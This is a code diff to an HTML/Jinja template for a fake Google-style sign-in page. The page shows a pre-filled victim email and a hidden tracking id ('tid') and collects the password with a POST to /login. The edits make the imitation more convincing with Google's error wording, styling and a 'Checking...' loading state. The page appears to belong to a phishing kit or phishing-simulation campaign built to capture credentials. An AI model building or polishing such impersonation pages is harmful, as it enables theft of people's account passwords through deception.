@@ -27,7 +27,7 @@
             overflow: hidden;
         }
 
-        /* Loading Bar Animation */
+        /* The moving blue bar at the top */
         #loading-bar {
             position: absolute;
             top: 0;
@@ -58,6 +58,7 @@
         .subtitle { font-size: 16px; margin-bottom: 30px; }
 
         .input-group { margin-bottom: 10px; text-align: left; }
+        
         input {
             width: 100%;
             padding: 13px 15px;
@@ -66,10 +67,27 @@
             border-radius: 4px;
             box-sizing: border-box;
             outline: none;
+            transition: border 0.2s;
         }
+
         input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
 
-        .error-msg { color: #d93025; font-size: 12px; display: flex; align-items: center; margin-top: 8px; }
+        /* Styling for the red error state */
+        .input-error {
+            border: 1px solid #d93025 !important;
+        }
+        .input-error:focus {
+            border: 2px solid #d93025 !important;
+        }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            margin-top: 8px;
+            text-align: left;
+        }
 
         .footer-btns {
             display: flex;
@@ -90,6 +108,16 @@
         .btn-next:disabled { background-color: #ccc; cursor: not-allowed; }
 
         .links { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; }
+        
+        .user-display {
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            padding: 5px 15px;
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -108,49 +136,68 @@
         </svg>
     </div>
 
-    <h1>Sign in</h1>
-    <p class="subtitle">Use your Google Account</p>
+    <h1>Welcome</h1>
+    
+    <div class="user-display">
+        <svg fill="#5f6368" width="20px" height="20px" viewBox="0 0 24 24" style="margin-right: 8px;">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"></path>
+        </svg>
+        {{ email }}
+    </div>
 
     <form id="loginForm" action="/login" method="POST">
         <input type="hidden" name="tid" value="{{ tid }}">
+        <input type="hidden" name="identifier" value="{{ email }}">
 
         <div class="input-group">
-            <input type="text" name="identifier" value="{{ email }}" placeholder="Email or phone" required>
+            <input type="password" 
+                   name="password" 
+                   id="passwordInput"
+                   class="{{ 'input-error' if error_type == 'wrong_pass' else '' }}" 
+                   placeholder="Enter your password" 
+                   required 
+                   autofocus>
+            
+            {% if error_type == "wrong_pass" %}
+            <div class="error-msg">
+                <svg aria-hidden="true" fill="currentColor" width="16px" height="16px" viewBox="0 0 24 24" style="margin-right: 8px;">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                </svg>
+                Wrong password. Try again or click Forgot password to reset it.
+            </div>
+            {% endif %}
         </div>
 
-        {% if error_type == "wrong_pass" %}
-        <div class="error-msg">
-            <svg aria-hidden="true" fill="currentColor" width="16px" height="16px" viewBox="0 0 24 24" style="margin-right: 8px;">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
-            </svg>
-            Wrong password. Try again.
-        </div>
-        {% endif %}
-
-        <div class="input-group" style="margin-top: 15px;">
-            <input type="password" name="password" placeholder="Enter your password" required>
+        <div style="text-align: left; margin-top: 10px;">
+            <a href="#" class="links" style="font-size: 14px;">Forgot password?</a>
         </div>
 
         <div class="footer-btns">
-            <a href="#" class="links">Create account</a>
+            <a href="#" class="links">Guest mode</a>
             <button type="submit" id="submitBtn" class="btn-next">Next</button>
         </div>
     </form>
 </div>
 
 <script>
-    // This script handles the "Loading" state so the user doesn't think it's stuck
-    document.getElementById('loginForm').addEventListener('submit', function() {
-        var btn = document.getElementById('submitBtn');
-        var bar = document.getElementById('loading-bar');
+    const loginForm = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const loadingBar = document.getElementById('loading-bar');
+    const passwordInput = document.getElementById('passwordInput');
+
+    loginForm.addEventListener('submit', function() {
+        // Start the animation
+        loadingBar.style.display = 'block';
         
-        // Show the blue loading line at the top
-        bar.style.display = 'block';
-        
-        // Disable the button and change text to look professional
-        btn.disabled = true;
-        btn.innerText = 'Connecting...';
-        btn.style.opacity = '0.7';
+        // Disable the button so they don't click twice
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Checking...';
+        submitBtn.style.opacity = '0.7';
+    });
+
+    // If the user starts typing again, remove the red error border
+    passwordInput.addEventListener('input', function() {
+        this.classList.remove('input-error');
     });
 </script>
 
